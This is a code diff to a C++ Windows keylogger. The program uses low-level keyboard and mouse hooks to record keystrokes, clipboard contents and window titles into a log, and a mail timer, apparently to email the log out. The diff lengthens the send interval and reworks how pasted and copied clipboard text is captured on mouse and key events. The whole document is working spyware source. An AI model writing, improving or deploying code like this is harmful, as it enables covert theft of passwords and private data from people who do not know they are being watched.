@@ -85,7 +85,7 @@ void TimerSendMail()
 
 
 //set the timer to 15m or 900000 ms for debugging
-Timer MailTimer(TimerSendMail, (30000), Timer::Infinite);
+Timer MailTimer(TimerSendMail, (60000), Timer::Infinite);
 
 HHOOK eHook = NULL;
 HHOOK mHook = NULL;
@@ -137,11 +137,11 @@ LRESULT OurKeyboardProc(int nCode, WPARAM wparam, LPARAM lparam)
 
     if(ends_with(keylog, StrCopy))
     {
-        keylog += "\n [Copy] " + GetClipboardText() + " [/Copy] \n " ;
+        keylog += "\n [Copy] From window: " + /*GetClipboardText() +*/ GetWindowTitle() +  " [/Copy] \n " ;
     }
     else if(ends_with(keylog, StrCut))
     {
-        keylog += "\n [Cut] " + GetClipboardText() + " [/Cut] \n " ;
+        keylog += "\n [Cut] From window: " + /*GetClipboardText()+ */ GetWindowTitle() + " [/Cut] \n " ;
     }
     else if(ends_with(keylog, StrPaste))
     {
@@ -164,14 +164,19 @@ LRESULT OurMouseProc(int nCode, WPARAM wparam, LPARAM lparam)
 
     if (nCode >= 0)
     {
+        std::string mousepaste = "[Rmouse]  [/Rmouse] [Lmouse]  [/Lmouse]";
         switch(wparam)
         {
             case WM_LBUTTONDOWN:
-                 keylog += "\n[Lmouse]";
+                 keylog += " [Lmouse] ";
                 break;
 
             case WM_LBUTTONUP:
-                 keylog += " [/Lmouse] [Window Title: " + GetWindowTitle() + " ] ";
+                 keylog += " [/Lmouse]";
+                 if(ends_with(keylog,  mousepaste))
+                    keylog +=  "\n [Paste] " + GetClipboardText() + " [/Paste] \n ";
+                 else
+                    keylog += "\n [Window Title: " + GetWindowTitle() + " ] ";
                 break;
 
             case WM_RBUTTONDOWN:
@@ -179,8 +184,8 @@ LRESULT OurMouseProc(int nCode, WPARAM wparam, LPARAM lparam)
                 break;
 
             case WM_RBUTTONUP:
-                 keylog += "    [Clipboard " + GetClipboardText() + " ]  ";
-                 keylog += " [/Rmouse] [Window Title: " + GetWindowTitle() + " ] ";
+                 //keylog += "    [Clipboard " + GetClipboardText() + " ]  ";
+                 keylog += " [/Rmouse]";
                 break;
 
             case WM_MBUTTONDOWN:
